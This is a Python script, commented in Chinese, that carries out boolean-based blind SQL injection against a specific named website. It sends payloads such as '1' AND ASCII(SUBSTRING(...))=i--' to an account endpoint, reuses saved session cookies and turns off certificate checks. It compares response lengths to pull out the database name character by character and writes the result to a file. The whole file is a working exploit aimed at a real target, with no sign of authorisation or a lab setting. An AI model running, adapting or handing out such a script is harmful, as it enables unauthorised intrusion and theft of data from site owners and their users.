#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib.parse
import json
import time
import urllib3
urllib3.disable_warnings()

class BooleanBasedExtract:
    def __init__(self):
        self.base_url = "https://emsone.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.load_session()
        self.db_info = {}
        
    def load_session(self):
        try:
            with open('session_cookies.json', 'r') as f:
                cookies = json.load(f)
                self.session.cookies.update(cookies)
        except:
            pass
    
    def get_response_length(self, payload):
        """获取响应长度"""
        url = f"{self.base_url}/Account/GetUserInfo?id={urllib.parse.quote(payload)}"
        try:
            r = self.session.get(url, timeout=10)
            return len(r.content)
        except:
            return 0
    
    def extract_char(self, query, position):
        """提取单个字符（布尔盲注）"""
        # 获取正常响应长度
        normal_length = self.get_response_length("1")
        
        for i in range(32, 127):
            char = chr(i)
            if char in ['%', "'", '"', '\\']:
                continue
            
            # 布尔盲注payload
            payload = f"1' AND ASCII(SUBSTRING(({query}), {position}, 1))={i}--"
            length = self.get_response_length(payload)
            
            if length != normal_length:
                return char
        
        return None
    
    def extract_string(self, query, max_len=50):
        """提取字符串"""
        result = ""
        
        for pos in range(1, max_len + 1):
            char = self.extract_char(query, pos)
            if char:
                result += char
                print(f"    [+] 位置 {pos}: {char} -> {result}")
            else:
                break
            time.sleep(0.3)
        
        return result if result else None
    
    def extract_database_name(self):
        """提取数据库名"""
        print("[*] 提取数据库名...")
        db_name = self.extract_string("SELECT database()", max_len=50)
        if db_name:
            self.db_info['database'] = db_name
            print(f"    [+] 数据库名: {db_name}")
        return db_name
    
    def run_all(self):
        """执行提取"""
        print("="*60)
        print("布尔盲注数据库提取")
        print("="*60)
        
        # 测试响应差异
        print("\n[*] 测试响应差异...")
        normal = self.get_response_length("1")
        true_payload = "1' AND 1=1--"
        false_payload = "1' AND 1=2--"
        
        true_len = self.get_response_length(true_payload)
        false_len = self.get_response_length(false_payload)
        
        print(f"    正常: {normal}")
        print(f"    1=1: {true_len}")
        print(f"    1=2: {false_len}")
        
        if true_len == false_len:
            print("    [-] 响应无差异，布尔盲注不可用")
            return
        
        # 提取数据库名
        self.extract_database_name()
        
        # 保存结果
        with open('database_boolean_extracted.json', 'w', encoding='utf-8') as f:
            json.dump(self.db_info, f, indent=2, ensure_ascii=False)

if __name__ == "__main__":
    extractor = BooleanBasedExtract()
    extractor.run_all()